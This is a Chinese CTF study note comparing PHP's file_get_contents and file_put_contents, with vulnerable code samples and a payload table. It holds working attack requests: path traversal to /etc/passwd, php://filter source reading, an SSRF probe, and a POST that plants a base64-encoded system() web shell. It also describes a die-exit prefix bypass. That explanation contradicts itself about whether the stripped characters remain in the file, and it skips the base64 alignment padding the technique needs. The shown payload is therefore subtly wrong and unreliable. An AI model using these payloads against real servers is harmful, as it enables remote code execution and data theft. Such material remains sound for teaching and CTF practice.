---
title: PHP 文件读写函数对比：file_get_contents 与 file_put_contents
category: 基础/PHP
tags: [PHP, file_get_contents, file_put_contents, php://filter, 文件读取, 文件写入, 死亡exit]
order: 3
---

> 说明：原文件名写作「某 get && put 核心功能对比」，正文实际讲的是 PHP 的
> `file_get_contents()` 与 `file_put_contents()` 这对文件读写函数，与 HTTP 的 GET/PUT
> 方法无关，故按内容重新命名。

## 一句话概括

`file_get_contents()` 是**文件 → 变量**（读），`file_put_contents()` 是**变量 → 文件**（写）。方向相反，对应的漏洞也相反：前者对应**信息泄露 / SSRF**，后者对应**任意文件写入 / RCE**。

## 原理

### 1. 核心功能对比

| 特性 | `file_get_contents()` | `file_put_contents()` |
| :--- | :--- | :--- |
| **主要功能** | **读取**文件内容 | **写入**内容到文件 |
| **数据流向** | 文件 → 变量 | 变量 → 文件 |
| **返回值** | 文件内容（字符串） | 写入的字节数（int） |
| **操作方向** | 输入 | 输出 |
| **漏洞类型** | 信息泄露、SSRF | 任意文件写入、RCE |
| **攻击目标** | 读取敏感文件 | 写入 Web Shell |
| **过滤器作用** | 对读取内容**编码** | 对写入内容**解码** |
| **危险程度** | 中危（信息泄露） | 高危（代码执行） |

**简单记忆：**

- `file_get_contents` = “把文件内容拿给我” → **读取**漏洞
- `file_put_contents` = “把这些内容放进文件” → **写入**漏洞

### 2. `file_get_contents()` —— 文件读取器

**功能**：从文件读取内容到字符串。

**语法：**

```php
string file_get_contents(string $filename)
```

**示例：**

```php
// 读取文本文件
$content = file_get_contents('document.txt');
echo $content;

// 读取网页内容
$html = file_get_contents('https://example.com');
echo $html;

// 读取 PHP 文件源码（通过过滤器）
$code = file_get_contents('php://filter/convert.base64-encode/resource=config.php');
echo base64_decode($code);
```

**实际应用：**

- 读取配置文件
- 获取 API 响应
- 下载网页内容
- 文件包含漏洞利用

### 3. `file_put_contents()` —— 文件写入器

**功能**：将字符串写入文件。

**语法：**

```php
int file_put_contents(string $filename, mixed $data)
```

**示例：**

```php
// 写入文本文件
file_put_contents('log.txt', 'Error: something happened');

// 追加内容（使用 FILE_APPEND 标志）
file_put_contents('log.txt', "\nNew log entry", FILE_APPEND);

// 写入序列化数据
$data = ['user' => 'admin', 'pass' => '123456'];
file_put_contents('data.dat', serialize($data));

// 利用过滤器写入 Web Shell
file_put_contents(
    'php://filter/convert.base64-decode/resource=shell.php',
    'PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4='
);
```

**实际应用：**

- 写日志文件
- 生成配置文件
- 缓存数据
- 文件上传漏洞利用

### 4. 数据流向

**`file_get_contents()`：**

```text
[文件系统] --读取--> [PHP变量] --显示--> [浏览器]
   flag.php    →     $content    →    用户看到flag
```

**`file_put_contents()`：**

```text
[用户输入] --传入--> [PHP变量] --写入--> [文件系统]
  恶意代码    →      $content     →     shell.php
```

一句话概括这两个方向的攻防含义：**读函数让数据从服务端流向你（泄露），写函数让你把数据留在服务端（持久化）。**

### 5. 结合 `php://filter` 时的方向差异

`php://filter` 是一条「过滤器管道」，**读写两个方向的过滤器作用正好相反**：

**读取时编码：**

```php
// file_get_contents - 读取并编码
$encoded = file_get_contents('php://filter/convert.base64-encode/resource=flag.php');
// $encoded 是 Base64 编码后的内容
```

**写入时解码：**

```php
// file_put_contents - 解码后写入
file_put_contents('php://filter/convert.base64-decode/resource=shell.php', 'PD9waHA...');
// 写入的是解码后的原始 PHP 代码
```

> **为什么这么设计？** `php://filter` 的语义是「在真实 I/O 的两侧加处理层」。读的时候，处理层在**数据从文件出来之后**生效，所以选 `base64-encode` 就是把原始内容**编码后交给你**；写的时候，处理层在**数据进入文件之前**生效，所以选 `base64-decode` 就是把你给的字符串**解码后再落盘**。记住「过滤器总是朝向自己这一侧加工」就不会记反。

### 6. 标志参数对比

**`file_get_contents()` 的标志：**

```php
// 使用上下文流
$context = stream_context_create(['http' => ['method' => 'GET']]);
$content = file_get_contents('http://example.com', false, $context);
```

**`file_put_contents()` 的标志：**

```php
// FILE_APPEND - 追加而不是覆盖
file_put_contents('log.txt', 'new entry', FILE_APPEND);

// LOCK_EX - 写入时锁定文件
file_put_contents('data.txt', $content, LOCK_EX);
```

## 本题情景与解题手法

原文里的三个 CTF 题目骨架，正好对应三种典型场景。

### 场景一：文件读取漏洞（中危）

题面代码：

```php
<?php
$file = $_GET['file'];
echo file_get_contents($file);
?>
```

**解法**：直接控制路径读敏感文件。

```http
GET /?file=../../etc/passwd HTTP/1.1
Host: 靶机地址
```

若目标被 `is_file()` 之类的检查拦住，改用包装器：

```http
GET /?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
```

**只能读取敏感文件，无法直接执行命令。**

### 场景二：文件写入漏洞（高危）

题面代码：

```php
<?php
$file = $_GET['file'];
$content = $_POST['content'];
file_put_contents($file, $content);
?>
```

**解法**：直接写入 Web Shell，获得服务器控制权。

```http
POST /?file=shell.php HTTP/1.1
Host: 靶机地址
Content-Type: application/x-www-form-urlencoded

content=<?php system($_GET['cmd']); ?>
```

**要拿到执行结果，还差一步“激活”** —— 写出文件只是把代码**放到磁盘上**，代码不会自己跑。必须再发一个请求去**访问**那个文件：

```text
http://靶机地址/shell.php?cmd=id
```

### 场景三：死亡 exit 绕过

题面代码：

```php
<?php
$file = $_GET['file'];
$content = $_POST['content'];
file_put_contents($file, "<?php die('exit');?>" . $content);
?>
```

这段代码在**你写的内容前面**强插了一句 `<?php die('exit');?>`，即便你写出了 shell，一访问就立刻 `die`，后面的代码永远执行不到。

**解法**：用 `php://filter` 在写入前做一次编码转换，让那句 `die` 在解码之后变成**乱码**，从而失效。

```http
POST /vulnerable.php?file=php://filter/write=convert.base64-decode/resource=shell.php HTTP/1.1
Host: 靶机地址
Content-Type: application/x-www-form-urlencoded

content=PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

- 落盘前，真实内容是 `<?php die('exit');?>PD9waHAg...`
- `convert.base64-decode` 只认 `A-Za-z0-9+/=` 这些字符，`<?php die('exit');?>` 里的 `<?`、`(`、`'`、`;`、`>` **全部不是合法 Base64 字符，会被直接忽略**
- 于是真正被解码的只有后半段 `PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`，解码结果就是 `<?php system($_GET['cmd']);?>`
- **更妙的是**：被忽略的那些字符虽然不参与解码，但它们**仍然留在文件里**，只是恰好因为不是合法 Base64 而被跳过 —— 落盘的文件里 `die` 语句已经被“吃掉”了

最终文件内容：

```php
<?php system($_GET['cmd']); ?>
```

> 关于 Base64 / ROT13 两种绕法的取舍，见 `编码-ROT13与Base64选型.md`。

### 注入手法一句话总结

> **读**：用户可控的 `$file` 直接丢进 `file_get_contents()` / `readfile()` / `include()` → `../` 或 `php://filter` → 拿源码或敏感文件。
> **写**：用户可控的 `$file` + `$content` 丢进 `file_put_contents()` → 写 shell → **再发一次请求激活** → RCE。
> **写 + 死亡 exit**：前缀里有 `die()` 时，用 `php://filter/write=convert.base64-decode`（或 `string.rot13`）让前缀在解码时失效。

## 利用条件

**读类漏洞成立需要：**

1. 后端把用户输入直接当作路径传给读函数（无白名单、无 `basename()` 之类的收敛）；
2. 进程对目标文件有读权限；
3. 有回显（`echo`、`readfile` 直接输出），否则要配合外带。

**写类漏洞成立需要：**

1. 用户能同时控制**路径**和**内容**；
2. PHP 进程对目标目录**有写权限**；
3. 写出的文件落在**可被 Web 访问且会被解析**的目录下（否则写了也执行不了）；
4. 没有把内容整体做白名单校验。

## Payload 速查

| 目的 | Payload |
| :--- | :--- |
| 读 Linux 敏感文件 | `?file=../../../../etc/passwd` |
| 读 PHP 源码（Base64） | `?file=php://filter/convert.base64-encode/resource=index.php` |
| 读 PHP 源码（ROT13） | `?file=php://filter/read=string.rot13/resource=index.php` |
| 探测 SSRF | `?file=http://x.x.x.x/` |
| 写 Web Shell | `file_put_contents('shell.php','<?php system($_GET["cmd"]);?>')` |
| 绕 `<?php die();?>` 前缀 | `?file=php://filter/write=convert.base64-decode/resource=shell.php` |
| 绕 `<?php die();?>` 前缀（ROT13） | `?file=php://filter/write=string.rot13/resource=shell.php` |

## 踩坑与备注

- **原文里那个误解很典型，这里保留并纠正**：曾经以为「`file_get_contents` 可以直接上传命令内容让服务器执行，而 `file_put_contents` 只是把命令放进文件、还需再次激活才能使用」。**正好反了。** `file_get_contents()` **只读取、不执行** —— 就算你读的是 `shell.php`，读出来也是一段字符串，`echo` 出来页面上看到的只是源码文本。真正能「造出一个可执行文件」的是 `file_put_contents()`。
- **`file_get_contents()` 真正的危险在于两处**：
  1. **敏感信息泄露**：`echo file_get_contents('/etc/passwd');`、`echo file_get_contents('../config.php');`
  2. **SSRF**：`echo file_get_contents('http://192.168.1.1/admin');` —— 让服务器替你去访问内网
  3. **配合反序列化**：`$data = file_get_contents('payload.phar'); unserialize($data);` —— 读只是第一步，触发点在 `unserialize`
- **写文件 ≠ 拿到 RCE**：写出来的文件必须**被 Web 服务器当 PHP 解析**才算激活。写到 `/tmp` 里、写到 `.htaccess` 禁止解析的目录里，都白写。
- **落盘位置受 `open_basedir` 限制**：这是 PHP 层面真正卡住跨目录读写的东西，比路径过滤更难绕。
